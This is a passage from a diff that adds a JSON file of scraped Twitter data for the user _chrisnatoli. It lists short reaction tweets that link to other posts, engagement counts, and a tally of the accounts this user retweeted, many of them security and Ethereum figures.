+            "id": "966085793616818176",
+            "text": "Patterns are fun!https://twitter.com/vexmark/status/965971157001351168\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "965859012435525632": {
+            "id": "965859012435525632",
+            "text": "Woah!https://twitter.com/campuscodi/status/965788852299485186\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "965358561675984896": {
+            "id": "965358561675984896",
+            "text": "I'm sorry.. What?!https://twitter.com/moklick/status/964824689532170240\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "965183288544411648": {
+            "id": "965183288544411648",
+            "text": "Hehehehttps://twitter.com/shortxstack/status/964686205475573760\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "965056184645382145": {
+            "id": "965056184645382145",
+            "text": "Wise words!https://twitter.com/VitalikButerin/status/964838207215955969\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "963652151976386561": {
+            "id": "963652151976386561",
+            "text": "Coooool!https://twitter.com/headinthebox/status/955469859327942656\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "963647217331507200": {
+            "id": "963647217331507200",
+            "text": "Deep words! Always remember to be yourself! :)https://twitter.com/blackroomsec/status/963565783891763203\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "960873893513711617": {
+            "id": "960873893513711617",
+            "text": "LOLhttps://twitter.com/ynakamura56/status/960709372081930245\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "958481490404294656": {
+            "id": "958481490404294656",
+            "text": "Excellent words! https://twitter.com/blackroomsec/status/958399418318934017\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "955951181909573632": {
+            "id": "955951181909573632",
+            "text": "Excellent talk! Watched it live and about to re-watch! :Dhttps://twitter.com/agc93/status/955762842698788865\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 1,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "950117265940230145": {
+            "id": "950117265940230145",
+            "text": "Be careful out there!https://twitter.com/bad_packets/status/949901603972177920\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "943996172942770176": {
+            "id": "943996172942770176",
+            "text": "This one cracked me up!pic.twitter.com/jHspVLpM6j",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "943252668587245568": {
+            "id": "943252668587245568",
+            "text": "Good messages in this article, be careful!https://twitter.com/internetofshit/status/942784091832889345\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "943250127505965057": {
+            "id": "943250127505965057",
+            "text": "Hahaha this sounds familiar. Me: \"oh this is cool\" \nFriend: \"So I put $5k on it since you said it was good\" \n\n:|https://twitter.com/Snowden/status/943167159647330306\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "935773754172379136": {
+            "id": "935773754172379136",
+            "text": "lololhttps://twitter.com/Viss/status/935681868845932544\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "920895671166689280": {
+            "id": "920895671166689280",
+            "text": "hehehehttps://twitter.com/blackroomsec/status/920672888704962560\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "920100715145523200": {
+            "id": "920100715145523200",
+            "text": "https://twitter.com/internetofshit/status/919838159478951936\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "917167406899802113": {
+            "id": "917167406899802113",
+            "text": "Such elegance - going to be quoting this quite a bithttps://twitter.com/pmelson/status/916711033783406592\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "917167001600061440": {
+            "id": "917167001600061440",
+            "text": "Welp.https://twitter.com/bad_packets/status/916561897742229504\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "916142871547228160": {
+            "id": "916142871547228160",
+            "text": "How are these so accurate!https://twitter.com/PHDcomics/status/888752996024274945\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        },
+        "913187991404765184": {
+            "id": "913187991404765184",
+            "text": "My life now :Phttps://twitter.com/PHDcomics/status/913150548857069568\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 2,
+            "num_retweets": 0,
+            "num_replies": 1
+        },
+        "868341764947558400": {
+            "id": "868341764947558400",
+            "text": "Verifying myself: I am natc on Keybase.io. kPCesSiBBLrH6o1Txq1kUS7vfdkvYLMKEqNx / https://keybase.io/natc/sigs/kPCesSiBBLrH6o1Txq1kUS7vfdkvYLMKEqNx\u00a0\u2026",
+            "username": "_chrisnatoli",
+            "num_likes": 0,
+            "num_retweets": 0,
+            "num_replies": 0
+        }
+    },
+    "num_retweets_by_originator": {
+        "pet3rpan_": 1,
+        "drinkcoffee2010": 1,
+        "IEEESSP": 1,
+        "sigp_io": 3,
+        "AlexSkidanov": 4,
+        "drakefjustin": 2,
+        "dannyryan": 9,
+        "x0rz": 7,
+        "elonmusk": 2,
+        "marcnewlin": 1,
+        "willenck": 1,
+        "owocki": 1,
+        "markpereir": 1,
+        "veryNR": 1,
+        "gentilkiwi": 1,
+        "tsusanka": 1,
+        "r_redteamsec": 1,
+        "protolambda": 1,
+        "ethZed": 15,
+        "AgeManning": 3,
+        "paulhauner": 12,
+        "NEARProtocol": 1,
+        "terencechain": 7,
+        "peter_szilagyi": 12,
+        "el33th4xor": 4,
+        "internetofshit": 1,
+        "AcademicsSay": 3,
+        "Linktimetech": 1,
+        "NicolasPapernot": 1,
+        "jinglanW": 2,
+        "phildaian": 2,
+        "tomterado": 1,
+        "VitalikButerin": 10,
+        "socrates1024": 4,
+        "PolTorrent": 1,
+        "VladZamfir": 7,
+        "cozieuwu": 1,
+        "alexberegszaszi": 2,
+        "payloadartist": 1,
+        "aantonop": 2,
+        "claudiocontin": 1,
+        "shipulin_anton": 1,
+        "barnabemonnot": 1,
+        "raulvk": 1,
+        "adiasg": 1,
+        "metamask_io": 1,
+        "lrettig": 2,
+        "JEhrenhofer": 1,
+        "ethereum": 8,
+        "StarkWareLtd": 1,
+        "naterush1997": 1,
+        "benjaminion_xyz": 1,
+        "JohBa": 1,
+        "c0d3inj3cT": 1,
+        "winter_heidi": 1,
+        "EFDevcon": 1,
+        "campuscodi": 4,
+        "shodanhq": 1,
+        "golang": 1,
+        "DirectoryRanger": 1,
+        "work_blockchain": 1,
+        "ethchris": 6,
+        "ChrisLundkvist": 2,
+        "dostoevskylabs": 1,
+        "mainframed767": 1,
+        "BarnesMJ": 1,
+        "bcrypt": 5,
+        "polkadotnetwork": 4,
+        "ferrisjabr": 1,
+        "computerfact": 1,
+        "CoinSecPodcast": 1,
+        "curioman2": 1,
+        "sweis": 1,
+        "gavofyork": 3,
+        "EdOverflow": 1,
+        "KukicAdo": 1,
+        "climagic": 5,
+        "drewconway": 1,
+        "da5ch0": 1,
+        "lopp": 1,
+        "brave": 1,
+        "cackerman1": 1,
+        "omespino": 1,
+        "Dinosn": 1,
+        "TrendingGolang": 1,
+        "Alra3ees": 2,
+        "web3foundation": 1,
+        "BlockchainEDU": 1,
+        "hanno": 1,
+        "ParityTech": 1,
+        "_bl4de": 1,
+        "xkcdComic": 1,
+        "wireghoul": 1,
+        "briankrebs": 2,
+        "0x09AL": 1,
+        "jessysaurusrex": 1,
+        "zmanian": 1,
+        "cryptic_monk": 1,
+        "LefterisJP": 1,
+        "BitcoinMagazine": 1,
+        "lorenzofb": 1,
+        "ConsenSys": 1,
+        "ElReg": 1,
+        "ArminVanBitcoin": 1,
+        "DRX_Sicher": 1,
+        "GossiTheDog": 1,
+        "BrendanEich": 1,
+        "jeeger": 1,
+        "BoredElonMusk": 1,
+        "jdub": 1,
+        "googledevs": 1,
+        "RomanYurchak": 1,
+        "bascule": 1,
+        "RachhLoves": 1,
+        "whalepool": 1,
+        "Andrew___Morris": 1,
+        "xorrior": 1,
+        "IOHK_Charles": 1,
+        "officialmcafee": 1,
+        "BryceElder": 1,
+        "kvlly": 1,
+        "paul_pearce": 1,
+        "naval": 1,
+        "hashcat": 1,
+        "JamesCPoole": 1,
+        "technollama": 1,
+        "alexstamos": 1,
+        "Snowden": 1,
+        "defcon": 1,
+        "brunns": 1,
+        "secparam": 1,
+        "SpaceX": 1,
+        "ralphholz": 1,
+        "PHDcomics": 1,
+        "robertchrk": 1,
+        "patrickwardle": 1
+    },
+    "users_retweeted": [
+        "ethZed",
+        "paulhauner",
+        "peter_szilagyi",
+        "VitalikButerin",
+        "dannyryan",
+        "ethereum",
+        "x0rz",
+        "terencechain",
+        "VladZamfir",
+        "ethchris",
+        "bcrypt",
+        "climagic",
+        "AlexSkidanov",
+        "el33th4xor",
+        "socrates1024",
+        "campuscodi",
+        "polkadotnetwork",
+        "sigp_io",
+        "AgeManning",
+        "AcademicsSay",
+        "gavofyork",
+        "drakefjustin",
+        "elonmusk",
+        "jinglanW",
+        "phildaian",
+        "alexberegszaszi",
+        "aantonop",
+        "lrettig",
+        "ChrisLundkvist",
+        "Alra3ees",
+        "briankrebs",
+        "pet3rpan_",
+        "drinkcoffee2010",
+        "IEEESSP",
+        "marcnewlin",
+        "willenck",
+        "owocki",
+        "markpereir",
+        "veryNR",
+        "gentilkiwi",
+        "tsusanka",
+        "r_redteamsec",
+        "protolambda",
+        "NEARProtocol",
+        "internetofshit",
+        "Linktimetech",
+        "NicolasPapernot",
+        "tomterado",
+        "PolTorrent",
+        "cozieuwu",
+        "payloadartist",
+        "claudiocontin",
+        "shipulin_anton",
+        "barnabemonnot",
+        "raulvk",
+        "adiasg",
+        "metamask_io",
+        "JEhrenhofer",
+        "StarkWareLtd",
+        "naterush1997",
+        "benjaminion_xyz",
+        "JohBa",
+        "c0d3inj3cT",
+        "winter_heidi",
+        "EFDevcon",
+        "shodanhq",
+        "golang",
+        "DirectoryRanger",
+        "work_blockchain",
+        "dostoevskylabs",
+        "mainframed767",
+        "BarnesMJ",
+        "ferrisjabr",
+        "computerfact",
+        "CoinSecPodcast",
+        "curioman2",
+        "sweis",
+        "EdOverflow",
+        "KukicAdo",
+        "drewconway",
+        "da5ch0",
+        "lopp",
+        "brave",
+        "cackerman1",
+        "omespino",
+        "Dinosn",
+        "TrendingGolang",
+        "web3foundation",
+        "BlockchainEDU",
+        "hanno",
+        "ParityTech",
+        "_bl4de",
+        "xkcdComic",
+        "wireghoul",
+        "0x09AL",
+        "jessysaurusrex",
+        "zmanian",
+        "cryptic_monk",
+        "LefterisJP",
+        "BitcoinMagazine",
+        "lorenzofb",
+        "ConsenSys",
+        "ElReg",
+        "ArminVanBitcoin",
+        "DRX_Sicher",
+        "GossiTheDog",
+        "BrendanEich",
+        "jeeger",
+        "BoredElonMusk",
+        "jdub",
+        "googledevs",
+        "RomanYurchak",
+        "bascule",
+        "RachhLoves",
+        "whalepool",
+        "Andrew___Morris",
+        "xorrior",
+        "IOHK_Charles",
+        "officialmcafee",
+        "BryceElder",
+        "kvlly",
+        "paul_pearce",
+        "naval",
+        "hashcat",
+        "JamesCPoole",
+        "technollama",
+        "alexstamos",
+        "Snowden",
+        "defcon",
+        "brunns",
+        "secparam",
+        "SpaceX",
+        "ralphholz",
+        "PHDcomics",
+        "robertchrk",
+        "patrickwardle"
+    ]
+}
